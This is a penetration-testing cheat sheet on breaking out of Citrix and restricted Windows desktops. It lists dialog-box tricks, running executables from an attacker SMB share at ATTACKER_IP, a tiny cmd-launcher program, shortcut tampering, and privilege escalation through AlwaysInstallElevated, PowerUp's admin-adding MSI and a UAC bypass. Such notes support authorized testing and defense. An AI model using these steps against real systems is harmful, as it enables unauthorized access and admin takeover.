# Citrix / Restricted Desktop Breakout

## Basic Methodology
1. Gain access to a **Dialog Box**
2. Exploit the Dialog Box for **command execution**
3. **Escalate privileges** to gain higher access

## Bypassing Path Restrictions via Dialog Boxes
- Many desktop apps have File > Open, Save As, Import, Export, Help, Print that open Windows dialog boxes
- These dialog boxes can browse the filesystem even when File Explorer is restricted
- Use **Paint**, **Notepad**, **Wordpad**, etc.

### Using Paint to Browse Restricted Paths
1. Open Paint from Start Menu
2. File > Open
3. In the File Name field, enter UNC path: `\\127.0.0.1\c$\users\username`
4. Set File Type to "All Files"
5. Press Enter to browse the directory

## Accessing SMB Shares from Restricted Environment
```bash
# On attack machine
smbserver.py -smb2support share $(pwd)
```
- In Dialog Box, enter: `\\ATTACKER_IP\share`
- Right-click executables and select "Open" to run them

### pwn.exe (Simple CMD Launcher)
```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

## Alternate File Explorers
- **Explorer++** (portable, recommended): https://explorerplusplus.com/
- **Q-Dir**: alternative file manager
- These bypass folder restrictions set by Group Policy

## Alternate Registry Editors
- **SmallRegistryEditor**: https://sourceforge.net/projects/sre/
- **Simpleregedit**: https://sourceforge.net/projects/simpregedit/
- **Uberregedit**: https://sourceforge.net/projects/uberregedit/
- Bypass Group Policy blocking of regedit.exe

## Script Execution
- Create `evil.bat` containing `cmd`
- Execute it to spawn a Command Prompt
- Works when .bat/.vbs/.ps extensions auto-execute with their interpreters

## Modifying Existing Shortcuts
1. Right-click shortcut > Properties
2. Change Target field to `C:\Windows\System32\cmd.exe`
3. Execute the shortcut to spawn cmd

## Privilege Escalation After Breakout

### Check AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- If both are set to 1, can create MSI to add admin user

### Using PowerUp
```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```
- Creates UserAdd.msi that can add a local admin

### UAC Bypass
```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

## Resources
- [Breaking out of Citrix](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/)
- [Breaking out of Windows Environments](https://node-security.com/posts/breaking-out-of-windows-environments/)
